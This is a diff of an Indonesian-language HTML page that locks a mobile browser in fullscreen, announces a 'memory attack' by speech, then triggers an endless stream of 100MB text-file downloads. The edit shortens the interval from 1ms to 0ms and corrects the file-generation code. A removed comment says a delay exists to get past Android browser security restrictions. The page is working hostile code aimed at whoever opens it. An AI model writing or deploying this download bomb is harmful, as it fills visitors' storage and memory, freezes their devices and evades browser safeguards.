@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Auto Fullscreen & Infinite Spam Download (1ms x 100MB)</title>
+  <title>Auto Fullscreen & Infinite Spam Download (0ms x 100MB)</title>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -84,7 +84,7 @@
 <body>
   <div class="panel" id="main-panel">
     <h2>Mobile Auto-Fullscreen & Instant Spam</h2>
-    <p style="margin-bottom: 15px;">Ketuk tombol. Halaman WAJIB masuk layar penuh dahulu, lalu membom file teks 100MB setiap 1 milidetik.</p>
+    <p style="margin-bottom: 15px;">Ketuk tombol. Halaman WAJIB masuk layar penuh dahulu, lalu membom file teks 100MB setiap 0 milidetik.</p>
 
     <p>
       <button id="start" type="button">⚠️ LOCK FULLSCREEN & SPAM NOW ⚠️</button>
@@ -108,7 +108,7 @@
         window.speechSynthesis.cancel(); 
         const utterance = new SpeechSynthesisUtterance(text);
         utterance.lang = 'id-ID'; 
-        utterance.rate = 1.1;     
+        utterance.rate = 1.1;      
         window.speechSynthesis.speak(utterance);
       }
     };
@@ -117,8 +117,8 @@
     const prepareBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
-          const sizeInBytes = 1000000000; // 100 MB
-          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(100000); // Huruf 'A'
+          const sizeInBytes = 100000000; // 100 MB (100.000.000 byte)
+          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Character byte 'A'
           const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
@@ -145,7 +145,7 @@
       downloads.replaceChildren();
 
       // ==========================================
-      // TAHAP 1: HARUS MASUK FULLSCREEN DULU (MURNI TANPA BEBAN SCRIPT LAIN)
+      // TAHAP 1: FULLSCREEN
       // ==========================================
       speakText("Layar penuh diaktifkan. Bersiap memulai serangan memori.");
       
@@ -164,7 +164,7 @@
       }
 
       // ==========================================
-      // TAHAP 2: BERI JEDA 250MS BIARKAN GRAFIK MOBILE MENGUNCI LAYAR PENUH, BARU SPAM DINYALAKAN
+      // TAHAP 2: SPAM DENGAN INTERVAL 0ms
       // ==========================================
       setTimeout(() => {
         isLooping = true;
@@ -177,7 +177,7 @@
           const fileData = await prepareBlobAsync(fileCounter);
           objectUrls.push(fileData.url);
           
-          // Lemparkan ke bar notifikasi unduhan ponsel
+          // Lemparkan ke antrean unduhan browser
           triggerInstantDownload(fileData);
           
           status.textContent = `🚨 SPAM AKTIF! File ke-${fileCounter} (Total: ${fileCounter * 100} MB)`;
@@ -188,8 +188,8 @@
           }
 
           fileCounter++;
-        }, 1); // Kebiri antrean setiap 1 milidetik tanpa henti
-      }, 250); // Jeda 250 milidetik ini krusial untuk meloloskan restriksi keamanan browser Android!
+        }, 0); // Ubah nilai interval menjadi 0 ms
+      }, 250);
     });
   </script>
 </body>
